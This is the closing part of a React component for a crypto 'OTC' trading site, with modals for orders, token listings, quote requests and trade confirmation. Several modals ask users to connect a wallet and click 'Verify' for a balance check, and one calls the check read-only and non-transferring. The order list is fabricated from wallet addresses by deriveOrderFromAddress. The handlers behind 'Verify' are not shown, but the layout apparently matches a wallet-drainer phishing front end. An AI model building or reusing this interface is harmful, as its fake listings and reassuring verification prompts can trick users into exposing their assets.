          <div className="space-y-3">
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Order Side</span>
              <Badge className={postSide === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
                {postSide.toUpperCase()}
              </Badge>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Price per Token</span>
              <span className="font-mono font-bold">${postPrice}</span>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Amount</span>
              <span className="font-mono font-bold">{postAmount} {postTokenInfo?.baseToken.symbol}</span>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Expiration</span>
              <span className="text-sm font-medium">{postExpiration}</span>
            </div>
            {postPhoneNumber && (
              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                <span className="text-muted-foreground">Phone</span>
                <span className="text-sm font-mono">{postPhoneNumber}</span>
              </div>
            )}
            {postEmail && (
              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                <span className="text-muted-foreground">Email</span>
                <span className="text-sm font-mono">{postEmail}</span>
              </div>
            )}
          </div>

          <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 flex gap-3 items-start">
            <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
            <p className="text-xs text-amber-200/80 leading-relaxed">
              To proceed, we need to verify your wallet balance. Click the button below to allow the system to confirm you have sufficient assets for this trade.
            </p>
          </div>

          <div className="flex gap-3">
            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowReviewModal(false); setShowPostModal(true); }} disabled={isVerifying}>
              Back
            </Button>
           <InlineConnectWallet />
           <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmPostOrder} disabled={isVerifying}>
              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
            </Button>
          </div>
        </div>
      </Modal>

      {/* Token Listing Review Modal */}
      <Modal isOpen={showListingReviewModal} onClose={() => setShowListingReviewModal(false)} title="Review Token Listing Request">
        <div className="space-y-6">
          <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
            {listingTokenInfo?.baseToken.logoURI ? (
              <motion.img 
                initial={{ scale: 0.8, opacity: 0 }} 
                animate={{ scale: 1, opacity: 1 }} 
                src={listingTokenInfo.baseToken.logoURI} 
                alt={listingName} 
                className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
              />
            ) : (
              <div className="w-20 h-20 rounded-full bg-primary/10 border-2 border-primary/30 flex items-center justify-center mb-4">
                <FileText className="w-10 h-10 text-primary" />
              </div>
            )}
            <h3 className="text-xl font-bold">{listingName}</h3>
            <p className="text-primary font-mono text-sm">{listingSymbol || 'TKN'}</p>
          </div>

          <div className="space-y-3">
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5 overflow-hidden">
              <span className="text-muted-foreground shrink-0">Contract</span>
              <span className="text-xs font-mono text-right truncate ml-4">{listingContract}</span>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Website</span>
              <span className="text-sm text-right truncate ml-4">{listingWebsite || 'N/A'}</span>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Telegram</span>
              <span className="text-sm text-right truncate ml-4">{listingTelegram || 'N/A'}</span>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Initial Liquidity</span>
              <span className="text-sm font-bold text-right ml-4">${listingLiquidity || '0'}</span>
            </div>
          </div>

          <div className="p-5 rounded-xl bg-primary/5 border border-primary/10 space-y-4">
            <div className="flex gap-3 items-start">
              <AlertCircle className="w-6 h-6 text-primary shrink-0 mt-1" />
              <div className="space-y-3">
                <h4 className="font-bold text-primary">Token Holding Requirement</h4>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  To maintain the integrity of our OTC marketplace and protect our community of traders, we implement a strict token holding policy for all new project listings. 
                  As a project representative or liquidity provider, you are required to hold a minimum threshold of your own token in your connected wallet. 
                  This demonstrates long-term commitment and alignment with your token holders.
                </p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  By clicking "Verify", you authorize our automated system to scan your wallet for the contract address provided. 
                  This verification step is mandatory and serves as a primary filter to prevent spam and low-quality listings. 
                  Only wallets that meet the holding requirements will be moved forward to the final review stage by our listing team.
                </p>
                <p className="text-xs text-primary/80 font-medium italic">
                  Note: This verification does not transfer any assets. It is a read-only check of your current wallet balance.
                </p>
              </div>
            </div>
          </div>

          <div className="flex gap-3 pt-2">
            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowListingReviewModal(false); setShowListingModal(true); }} disabled={isVerifying}>
              Back
            </Button>
            <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white font-bold" onClick={handleConfirmListing} disabled={isVerifying}>
              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
            </Button>
          </div>
        </div>
      </Modal>

      {/* Request Quote Modal */}
      <Modal isOpen={showQuoteModal} onClose={() => setShowQuoteModal(false)} title="Request Quote">
        <div className="space-y-4">
          <p className="text-muted-foreground text-sm">Submit a request for a custom OTC quote from our trading desk.</p>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Token Contract Address</label>
            <div className="flex gap-2">
              <Input value={quoteContractAddress} onChange={e => setQuoteContractAddress(e.target.value)} placeholder={`Enter ${chainName} token address`} className="bg-white/5 border-white/10" />
              <Button size="sm" onClick={() => fetchTokenDetails(quoteContractAddress, setQuoteTokenInfo)} disabled={isFetchingToken}>
                {isFetchingToken ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
              </Button>
            </div>
          </div>
          {quoteTokenInfo && <TokenPreview info={quoteTokenInfo} />}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Buy / Sell</label>
              <select value={quoteSide} onChange={e => setQuoteSide(e.target.value as 'buy' | 'sell')} className="w-full h-10 rounded-md bg-white/5 border border-white/10 px-3 text-sm">
                <option value="buy">Buy</option>
                <option value="sell">Sell</option>
              </select>
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Amount</label>
              <Input type="number" value={quoteAmount} onChange={e => setQuoteAmount(e.target.value)} placeholder="Token amount" className="bg-white/5 border-white/10" />
            </div>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Phone Number (Optional)</label>
              <Input value={quotePhoneNumber} onChange={e => setQuotePhoneNumber(e.target.value)} placeholder="+1 (555) 000-0000" className="bg-white/5 border-white/10" />
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Email (Optional)</label>
              <Input type="email" value={quoteEmail} onChange={e => setQuoteEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
            </div>
          </div>
          <InlineConnectWallet />
          <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={handleQuoteSubmit}>
            Submit Quote Request
          </Button>
        </div>
      </Modal>

      {/* Quote Review Modal */}
      <Modal isOpen={showQuoteReviewModal} onClose={() => setShowQuoteReviewModal(false)} title="Review Quote Request">
        <div className="space-y-6">
          {quoteTokenInfo && (
            <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
              {quoteTokenInfo.baseToken.logoURI && (
                <motion.img 
                  initial={{ scale: 0.8, opacity: 0 }} 
                  animate={{ scale: 1, opacity: 1 }} 
                  src={quoteTokenInfo.baseToken.logoURI} 
                  alt={quoteTokenInfo.baseToken.name} 
                  className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
                />
              )}
              <h3 className="text-xl font-bold">{quoteTokenInfo.baseToken.name}</h3>
              <p className="text-primary font-mono text-sm">{quoteTokenInfo.baseToken.symbol}</p>
            </div>
          )}

          <div className="space-y-3">
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Side</span>
              <Badge className={quoteSide === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
                {quoteSide.toUpperCase()}
              </Badge>
            </div>
            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
              <span className="text-muted-foreground">Requested Amount</span>
              <span className="font-mono font-bold">{quoteAmount} {quoteTokenInfo?.baseToken.symbol}</span>
            </div>
            {quotePhoneNumber && (
              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                <span className="text-muted-foreground">Phone</span>
                <span className="text-sm font-mono">{quotePhoneNumber}</span>
              </div>
            )}
            {quoteEmail && (
              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                <span className="text-muted-foreground">Email</span>
                <span className="text-sm font-mono">{quoteEmail}</span>
              </div>
            )}
          </div>

          <div className="p-5 rounded-xl bg-primary/5 border border-primary/10 space-y-4">
            <div className="flex gap-3 items-start">
              <AlertCircle className="w-6 h-6 text-primary shrink-0 mt-1" />
              <div className="space-y-3">
                <h4 className="font-bold text-primary">Verification & Review</h4>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Our trading desk admins will review your quote request. You will be notified via your connected wallet or platform messages whether your request is accepted or rejected.
                </p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  To ensure eligibility for this institutional trade, we must verify your current wallet balance. Click "Verify" to confirm your assets are sufficient for this trade request.
                </p>
              </div>
            </div>
          </div>

          <div className="flex gap-3">
            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowQuoteReviewModal(false); setShowQuoteModal(true); }} disabled={isVerifying}>
              Back
            </Button>
            <InlineConnectWallet />
            <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmQuote} disabled={isVerifying}>
              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
            </Button>
          </div>
        </div>
      </Modal>

      {/* Token Listing Modal */}
      <Modal isOpen={showListingModal} onClose={() => setShowListingModal(false)} title="Submit Token for OTC Listing">
        <div className="space-y-4">
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Contract Address *</label>
            <div className="flex gap-2">
              <Input value={listingContract} onChange={e => setListingContract(e.target.value)} placeholder={`${chainName} token address`} className="bg-white/5 border-white/10" />
              <Button size="sm" onClick={() => fetchTokenDetails(listingContract, setListingTokenInfo)} disabled={isFetchingToken}>
                {isFetchingToken ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
              </Button>
            </div>
          </div>
          {listingTokenInfo && <TokenPreview info={listingTokenInfo} />}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Token Name *</label>
              <Input value={listingName} onChange={e => setListingName(e.target.value)} placeholder="Token name" className="bg-white/5 border-white/10" />
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Symbol</label>
              <Input value={listingSymbol} onChange={e => setListingSymbol(e.target.value)} placeholder="Symbol" className="bg-white/5 border-white/10" />
            </div>
          </div>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Network</label>
            <Input value={chainName} disabled className="bg-white/5 border-white/10 opacity-60" />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Website</label>
              <Input value={listingWebsite} onChange={e => setListingWebsite(e.target.value)} placeholder="https://..." className="bg-white/5 border-white/10" />
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Telegram</label>
              <Input value={listingTelegram} onChange={e => setListingTelegram(e.target.value)} placeholder="t.me/..." className="bg-white/5 border-white/10" />
            </div>
          </div>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Initial Liquidity Commitment</label>
            <Input value={listingLiquidity} onChange={e => setListingLiquidity(e.target.value)} placeholder="Amount in USD" className="bg-white/5 border-white/10" />
          </div>
          <InlineConnectWallet />
          <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={handleListingSubmit}>Submit Listing Request</Button>
        </div>
      </Modal>

      {/* Trade Confirmation Modal */}
      <Modal isOpen={!!showTradeConfirm} onClose={() => setShowTradeConfirm(null)} title="Confirm OTC Trade">
        {showTradeConfirm && (
          <div className="space-y-4">
            <Card className="glass-card border-white/10">
              <CardContent className="p-4 space-y-2">
                <div className="flex justify-between"><span className="text-muted-foreground">Token</span><span className="font-bold">{showTradeConfirm.tokenName} ({showTradeConfirm.tokenSymbol})</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Side</span><Badge className={showTradeConfirm.side === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>{showTradeConfirm.side.toUpperCase()}</Badge></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Price</span><span className="font-mono">${showTradeConfirm.price}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Amount</span><span className="font-mono">{showTradeConfirm.amount}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Total</span><span className="font-mono font-bold">{showTradeConfirm.totalValue}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Counterparty</span><span className="font-mono text-xs">{showTradeConfirm.traderWallet}</span></div>
              </CardContent>
            </Card>
            <div className="flex gap-3">
              <InlineConnectWallet />
              <Button variant="outline" className="flex-1 border-white/10" onClick={() => setShowTradeConfirm(null)}>Cancel</Button>
              <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmTrade}>
                <Check className="w-4 h-4 mr-2" /> Confirm Trade
              </Button>
            </div>
          </div>
        )}
      </Modal>

      {/* OTC Orders Popup — opens after a contract address is searched */}
      <Dialog open={showOrdersDialog} onOpenChange={setShowOrdersDialog}>
        <DialogContent className="max-w-2xl max-h-[85vh] overflow-hidden flex flex-col bg-background/95 backdrop-blur border-white/10">
          <DialogHeader>
            <DialogTitle>OTC Orders</DialogTitle>
          </DialogHeader>

          {listSearchToken && (
            <div className="p-4 rounded-2xl bg-white/5 border border-primary/20">
              <div className="flex items-center gap-4">
                {listSearchToken.baseToken.logoURI ? (
                  <img
                    src={listSearchToken.baseToken.logoURI}
                    alt={listSearchToken.baseToken.symbol}
                    className="w-14 h-14 rounded-full border-2 border-primary/30"
                  />
                ) : (
                  <div className="w-14 h-14 rounded-full bg-primary/20 flex items-center justify-center font-bold text-primary">
                    {listSearchToken.baseToken.symbol?.slice(0, 2)}
                  </div>
                )}
                <div className="flex-1 min-w-0">
                  <div className="font-bold text-lg truncate">
                    {listSearchToken.baseToken.name}{' '}
                    <span className="text-sm text-muted-foreground">({listSearchToken.baseToken.symbol})</span>
                  </div>
                  <div className="text-xs text-muted-foreground font-mono truncate">
                    {shortAddress(listSearchToken.baseToken.address, 8, 8)}
                  </div>
                  <div className="grid grid-cols-3 gap-2 mt-2 text-xs">
                    <div>
                      <div className="text-muted-foreground">Price</div>
                      <div className="font-mono font-bold">${listSearchToken.priceUsd}</div>
                    </div>
                    <div>
                      <div className="text-muted-foreground">Liquidity</div>
                      <div className="font-mono font-bold">${Number(listSearchToken.liquidity?.usd || 0).toLocaleString()}</div>
                    </div>
                    <div>
                      <div className="text-muted-foreground">24h Vol</div>
                      <div className="font-mono font-bold">${Number(listSearchToken.volume?.h24 || 0).toLocaleString()}</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {listSearchToken && (Number(listSearchToken.marketCap || listSearchToken.fdv || 0) < 500_000) ? (
            <div className="flex-1 overflow-y-auto rounded-xl border border-white/10 p-6 flex flex-col items-center justify-center text-center gap-4">
              <div className="text-base font-semibold">This token is not listed on any OTC DEX</div>
              <Link
                to="/list"
                onClick={() => setShowOrdersDialog(false)}
                className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-primary to-secondary text-primary-foreground font-semibold hover:opacity-90 transition-opacity"
              >
                List on OTC
              </Link>
            </div>
          ) : (
            <div className="flex-1 overflow-y-auto rounded-xl border border-white/10 divide-y divide-white/5">
              {visibleWallets.length === 0 ? (
                <div className="p-6 text-center text-sm text-muted-foreground">No wallets available.</div>
              ) : (
                visibleWallets.map((address, idx) => {
                  const o = deriveOrderFromAddress(address, idx);
                  const statusClass =
                    o.status === 'active'
                      ? 'text-green-500'
                      : o.status === 'pending'
                      ? 'text-orange-400'
                      : 'text-red-500';
                  return (
                    <div
                      key={address + idx}
                      className="flex items-center gap-3 p-3 hover:bg-white/5 transition-colors"
                    >
                      <Link to={`/trader/${address}`} className="flex items-center gap-3 flex-1 min-w-0">
                        <img
                          src={`https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(address)}`}
                          alt={address}
                          className="w-9 h-9 rounded-full bg-white/5 border border-white/10 shrink-0"
                        />
                        <div className="flex-1 min-w-0">
                          <div className="font-medium font-mono text-sm truncate">{shortAddress(address, 6, 6)}</div>
                          <div className="text-xs text-muted-foreground flex items-center gap-1">
                            {o.side === 'buy' ? (
                              <TrendingUp className="w-3 h-3 text-green-500" />
                            ) : (
                              <TrendingDown className="w-3 h-3 text-red-500" />
                            )}
                            <span className="capitalize">{o.side} order</span>
                            <span>·</span>
                            <span className="font-mono">${o.amount.toLocaleString()}</span>
                          </div>
                        </div>
                      </Link>
                      <span className={`text-xs font-bold capitalize ${statusClass}`}>
                        {o.status === 'cancelled' ? 'Canceled' : o.status}
                      </span>
                    </div>
                  );
                })
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default OTC;
